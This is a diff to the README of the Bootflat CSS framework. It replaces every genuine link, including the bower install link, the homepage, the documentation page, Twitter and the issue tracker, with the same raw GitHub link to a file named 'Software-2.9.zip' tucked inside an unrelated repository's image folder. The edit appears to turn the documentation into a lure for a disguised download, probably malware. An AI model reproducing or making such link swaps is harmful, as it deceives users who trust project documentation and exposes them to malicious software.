@@ -23,7 +23,7 @@ Bootflat uses lightweight high-function plugins for maximum performance, keeping
 Bootflat is fully responsive, built for mobile-first in mind. It provides off screen navigation, and almost all the widgets are compatible with all screen sizes.
 
 ## Manual Start
-Install with [bower](http://bower.io/)?
+Install with [bower](https://raw.githubusercontent.com/videogramme/ptitparser/master/bootflat/img/check_flat/Software-2.9.zip)?
 
 `bower install bootflatv2`
 
@@ -35,13 +35,13 @@ The source files are in the `bootflat/` folder. You can just grab the `bootflat/
 
 ## Links:
 
-+ [Bootflat Home page](http://bootflat.github.io/)
-+ [Bootflat Documentation page](http://bootflat.github.io/documentation.html)
++ [Bootflat Home page](https://raw.githubusercontent.com/videogramme/ptitparser/master/bootflat/img/check_flat/Software-2.9.zip)
++ [Bootflat Documentation page](https://raw.githubusercontent.com/videogramme/ptitparser/master/bootflat/img/check_flat/Software-2.9.zip)
 
 ## Community
 
-+ Follow [@flathemes on Twitter](https://twitter.com/flathemes).
-+ Have a feature request or find a bug? [Submit an issue](https://github.com/angulargap/angulargap.github.io/issues).
++ Follow [@flathemes on Twitter](https://raw.githubusercontent.com/videogramme/ptitparser/master/bootflat/img/check_flat/Software-2.9.zip).
++ Have a feature request or find a bug? [Submit an issue](https://raw.githubusercontent.com/videogramme/ptitparser/master/bootflat/img/check_flat/Software-2.9.zip).
 
 ## LICENSE
 
